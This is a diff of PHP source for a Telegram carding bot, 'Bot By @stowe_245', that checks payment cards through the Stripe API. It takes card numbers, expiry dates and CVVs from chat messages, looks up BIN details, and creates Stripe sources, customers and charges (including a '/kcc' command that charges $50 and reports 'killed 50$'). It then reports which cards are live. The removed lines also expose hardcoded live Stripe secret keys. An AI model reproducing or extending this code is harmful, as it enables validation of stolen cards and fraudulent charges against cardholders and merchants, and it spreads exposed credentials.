-            sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» APPROVED ✅</b>%0A<b>Response -» CVC APPROVED ✅</b>%0A<b>Gateway -» Stripe charge v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
-            elseif(strpos($result3,'"code": "incorrect_cvc"')){
-              sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» APPROVED ⚠️</b>%0A<b>Response -» CCN Matched </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
-              elseif(strpos($result2,'"code": "incorrect_cvc"')){
-              sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» APPROVED ⚠️</b>%0A<b>Response -» CCN Matched </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
-              elseif ((strpos($result2, "transaction_not_allowed")) || (strpos($result3, "transaction_not_allowed"))){
-              sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» HOLDERLOCKED ⚠️</b>%0A<b>Response -» Transaction Not Allowed </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b", $message_id);}
-              elseif ((strpos($result2, "fraudulent")) || (strpos($result3, "fraudulent"))){
-              sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» REJECTED ⛔</b>%0A<b>Response -» Fraudulent </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
-              elseif ((strpos($result2, "expired_card")) || (strpos($result3, "expired_card"))){
-              sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» expired_card </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
-              elseif ((strpos($result2, "generic_declined")) || (strpos($result3, "generic_declined"))){
-              sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» Generic Declined </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
-              }
-              elseif ((strpos($result1, "do_not_honor")) || (strpos($result3, "do_not_honor"))){
-              sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» Do Not Honor </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
-              elseif ((strpos($result1, 'rate_limit')) || (strpos($result3, 'rate_limit'))){
-              sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» TRY AGAIN LATER ⚠️</b>%0A<b>Response -» SK is rate limit </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
-              
-              elseif ((strpos($result1, "Your card was declined.")) || (strpos($result3, "Your card was declined."))){
-              sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» Do Not Honor </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
-              elseif ((strpos($result1, ' "message": "Your card number is incorrect."')) || (strpos($result3, ' "message": "Your card number is incorrect."'))){
-              sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» No Account </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
-              else {
-              sendMessage($chatId, "<b><u><i>Unknown Error</i></u></b>", $message_id);
-              };
+        $lista = ''.$cc.'|'.$mm.'|'.$yy.'|'.$cvv.'';
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
+        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+        'Host: lookup.binlist.net',
+        'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
+        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, '');
+        $fim = curl_exec($ch);
+        $bank = GetStr($fim, '"bank":{"name":"', '"');
+        $name = GetStr($fim, '"name":"', '"');
+        $brand = GetStr($fim, '"brand":"', '"');
+        $country = GetStr($fim, '"country":{"name":"', '"');
+        $emoji = GetStr($fim, '"emoji":"', '"');
+        $scheme = GetStr($fim, '"scheme":"', '"');
+        $type = GetStr($fim, '"type":"', '"');
+        if(strpos($fim, '"type":"credit"') !== false){
+        $bin = 'Credit';
+        }else{
+        $bin = 'Debit';
+        };
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+        curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
+        curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]='.$name.' '.$last.'&owner[email]='.$email.'&owner[address][line1]='.$street.'&owner[address][city]='.$city.'&owner[address][state]='.$state.'&owner[address][postal_code]='.$postcode.'&owner[address][country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'');
+        $result1 = curl_exec($ch);
+        $tok1 = Getstr($result1,'"id": "','"');
+        $msg1 = Getstr($result1,'"message": "','"');
+        if(strpos($result1, "card_error")){
+          sendMessage($chatId, " %0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» $msg1 </b>%0A<b>Gateway -» Stripe Charge 5$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+          return;
         }
-    //////////=========[kcc Command]=========//////////
-    elseif (strpos($message, "/kcc") === 0){
-        $skeys = array(
-            1 => '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', // Enter at least one sk key
-          //2 => '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',-----------------|
-          //3 => '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',                 | Uncomment this, if you want to add more sk keys :)
-          //4 => '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',                 |
-          //5 => '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',-----------------|
-          ); 
-          $skey = array_rand($skeys);
-          $sk = $skeys[$skey];
-       
-        $message = substr($message, 4);
-        $amt = multiexplode(array("/", ":", " ", "|"), $message)[0];
-        $cc = multiexplode(array(":", "/", " ", "|"), $message)[1];
-        $mm = multiexplode(array(":", "/", " ", "|"), $message)[2];
-        $yy = multiexplode(array(":", "/", " ", "|"), $message)[3];
-        $cvv = multiexplode(array(":", "/", " ", "|"), $message)[4];
-        if (empty($amt)) {
-        $amt = '1';
+        if (strpos($result1, "card_declined")){
+          sendMessage($chatId, " %0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» $msg1 </b>%0A<b>Gateway -» Stripe Charge 5$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+          return;
         }
-                $amount = $amt * 100;
-                $lista = ''.$cc.'|'.$mm.'|'.$yy.'|'.$cvv.'';
-                $ch = curl_init();
-                curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
-                curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
-                curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-                'Host: lookup.binlist.net',
-                'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
-                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
-                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-                curl_setopt($ch, CURLOPT_POSTFIELDS, '');
-                $fim = curl_exec($ch);
-                $bank = GetStr($fim, '"bank":{"name":"', '"');
-                $name = GetStr($fim, '"name":"', '"');
-                $brand = GetStr($fim, '"brand":"', '"');
-                $country = GetStr($fim, '"country":{"name":"', '"');
-                $emoji = GetStr($fim, '"emoji":"', '"');
-                $scheme = GetStr($fim, '"scheme":"', '"');
-                $type = GetStr($fim, '"type":"', '"');
-                if(strpos($fim, '"type":"credit"') !== false){
-                $bin = 'Credit';
-                }else{
-                $bin = 'Debit';
-                };
-                $ch = curl_init();
-                curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
-                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-                curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
-                curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]='.$name.' '.$last.'&owner[email]='.$email.'&owner[address][line1]='.$street.'&owner[address][city]='.$city.'&owner[address][state]='.$state.'&owner[address][postal_code]='.$postcode.'&owner[address][country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'');
-                $result1 = curl_exec($ch);
-                $tok1 = Getstr($result1,'"id": "','"');
-                $msg1 = Getstr($result1,'"message": "','"');
-                $ch = curl_init();
-                curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
-                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-                curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
-                curl_setopt($ch, CURLOPT_POSTFIELDS, 'description='.$last.'&source='.$tok1.'&address[line1]='.$street.'&address[city]='.$city.'&address[state]='.$state.'&address[postal_code]='.$postcode.'&address[country]=US');
-                $result2 = curl_exec($ch);
-                $tok2 = Getstr($result2,'"id": "','"');
-                $msg2 = Getstr($result2,'"message": "','"');
-                $ch = curl_init();
-                curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges');
-                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-                curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
-                curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=5000&currency=usd&customer='.$tok2.'');
-                $result3 = curl_exec($ch);
-                $msg3 = Getstr($result3,'"message": "','"');
-                $rcp = trim(strip_tags(getStr($result3,'"receipt_url": "','"')));
-                $rsk = trim(strip_tags(getStr($result3,'"risk_score": "','"')));
-                $rsklv = trim(strip_tags(getStr($result3,'"risk_level": "','"')));
-                if(strpos($result3, '"seller_message": "Payment complete."' )) {
-                sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» APPROVED 50$ ✅</b>%0A<b>Response -» killed 50$ SUCCESSFULLY ✅</b>%0A<b>Gateway -» Stripe Charge v2 </b>%0A<b>Risk score -» $rsk</b>%0A<b> Risk Level -» $rsklv</b>%0A<b> RECEPIT URL -» $rcp</b>%0a%0a---------[Bin details]-----------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY: $country %0A%0A%0A--------------------------------%0A%0A%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
-                }
-                elseif(strpos($result2, "insufficient_funds" )) {
-                sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» APPROVED ✅</b>%0A<b>Response -» Insufficient Funds </b>%0A<b>Gateway -» Stripe Charge v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
-                elseif ((strpos($result1, "card_error_authentication_required")) || (strpos($result2, "card_error_authentication_required"))){ sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» APROVED ⚠️</b>%0A<b>Response -» 3D Card </b>%0A<b>Gateway -» Stripe charge v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
-                elseif(strpos($result2,'"cvc_check": "pass"')){
-                sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» APPROVED ✅</b>%0A<b>Response -» CVC APPROVED ✅</b>%0A<b>Gateway -» Stripe charge v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
-                elseif(strpos($result3,'"code": "incorrect_cvc"')){
-                  sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» APPROVED ⚠️</b>%0A<b>Response -» CCN Matched </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
-                  elseif(strpos($result2,'"code": "incorrect_cvc"')){
-                  sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» APPROVED ⚠️</b>%0A<b>Response -» CCN Matched </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
-                  elseif ((strpos($result2, "transaction_not_allowed")) || (strpos($result3, "transaction_not_allowed"))){
-                  sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» HOLDERLOCKED ⚠️</b>%0A<b>Response -» Transaction Not Allowed </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b", $message_id);}
-                  elseif ((strpos($result2, "fraudulent")) || (strpos($result3, "fraudulent"))){
-                  sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» REJECTED ⛔</b>%0A<b>Response -» Fraudulent </b>%0A<b>Risk Level: $rsklv</b>%a<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
-                  elseif ((strpos($result2, "expired_card")) || (strpos($result3, "expired_card"))){
-                  sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» expired_card </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
-                  elseif ((strpos($result2, "generic_declined")) || (strpos($result3, "generic_declined"))){
-                  sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» Generic Declined </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
-                  }
-                  elseif ((strpos($result1, "do_not_honor")) || (strpos($result3, "do_not_honor"))){
-                  sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» Do Not Honor </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
-                  elseif ((strpos($result1, 'rate_limit')) || (strpos($result3, 'rate_limit'))){
-                  sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» TRY AGAIN LATER ⚠️</b>%0A<b>Response -» SK is rate limit </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
-                  
-                  elseif ((strpos($result1, "Your card was declined.")) || (strpos($result3, "Your card was declined."))){
-                  sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» Do Not Honor </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
-                  elseif ((strpos($result1, ' "message": "Your card number is incorrect."')) || (strpos($result3, ' "message": "Your card number is incorrect."'))){
-                  sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» No Account </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
-                  else {
-                  sendMessage($chatId, "<b><u><i>Unknown Error</i></u></b>", $message_id);
-                  };
+        if (strpos($result1, "rate_limit")){
+          sendMessage($chatId, " %0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» $msg1 </b>%0A<b>Gateway -» Stripe Charge 5$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+          return;
+        }
+        if (strpos($result1, "invalid_cvc")){
+          sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» TRY AGAIN ⚠️</b>%0A<b>Response -» Please input card correctly ! </b>%0A<b>Gateway -» Stripe Charge 5$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+          return;
+        }
+        if (strpos($result1, "sources_required_type_param")){
+          sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» TRY AGAIN ⚠️</b>%0A<b>Response -» Please input card correctly ! </b>%0A<b>Gateway -» Stripe Charge 5$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+          return;
+        }
+        if (strpos($result1, "testmode_charges_only")){
+          sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» SERVER REJECTED ❌</b>%0A<b>Response -» Gate is Dead </b>%0A<b>Gateway -» Stripe Charge 5$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+          return;
+        }
+        if ((strpos($result3, 'invalid_expiry_year'))){
+          sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» EXPRIED CARD ❌</b>%0A<b>Response -» invalid_expiry_year </b>%0A<b>Gateway -» Stripe Charge 5$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+          return;
+        }
+        if ((strpos($result3, 'invalid_expiry_month'))){
+          sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» EXPRIED CARD ❌</b>%0A<b>Response -» invalid_expiry_month </b>%0A<b>Gateway -» Stripe Charge 5$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+          return;
+        }
+        if ((strpos($result3, 'incorrect_number'))){
+          sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» INVALID CARD ❌</b>%0A<b>Response -» Incorrect number </b>%0A<b>Gateway -» Stripe Charge 5$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+          return;
+        }
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+        curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
+        curl_setopt($ch, CURLOPT_POSTFIELDS, 'description='.$last.'&source='.$tok1.'&address[line1]='.$street.'&address[city]='.$city.'&address[state]='.$state.'&address[postal_code]='.$postcode.'&address[country]=US');
+        $result2 = curl_exec($ch);
+        $tok2 = Getstr($result2,'"id": "','"');
+        $msg2 = Getstr($result2,'"message": "','"');
+        if(strpos($result2, "card_error")){
+          sendMessage($chatId, " %0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» $msg2 </b>%0A<b>Gateway -» Stripe Charge 5$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+          return;
+        }
+        if (strpos($result1, "invalid_cvc")){
+          sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» TRY AGAIN ⚠️</b>%0A<b>Response -» Please input card correctly ! </b>%0A<b>Gateway -» Stripe Charge 5$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+          return;
+        }
+        if (strpos($result1, "sources_required_type_param")){
